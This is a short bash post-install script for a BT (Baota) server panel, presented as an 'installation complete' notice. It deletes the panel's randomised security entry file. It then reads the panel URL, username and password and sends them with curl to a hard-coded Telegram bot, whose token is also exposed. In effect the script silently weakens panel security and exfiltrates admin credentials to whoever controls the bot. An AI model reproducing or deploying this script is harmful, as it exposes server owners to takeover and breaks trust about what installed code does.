#!/bin/bash

export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

#删除随机的安全入口
rm -rf /www/server/panel/data/admin_path.pl

noticeTG(){
    TOKEN=5368544643:AAFANegpqLEveFnwVANjFGVev1I-EvsViaA #TG机器人API—Token口令
    chat_ID=5251565559 #推送消息的ID（可以是个人、也可以是Group或Chanel）
    BtPanelURL=`echo 14 | bt |grep http`
    username=`echo 14 | bt |grep username`
    password=`echo 14 | bt |grep password`
    message_text="【纯净版系统安装完成通知】恭喜！您的系统已圆满安装完成，请查看！
    $BtPanelURL
    $username
    $password"
    #echo "$message_text"
    curl -s -X POST https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${chat_ID} -d text="${message_text}" > /dev/null
}

noticeTG
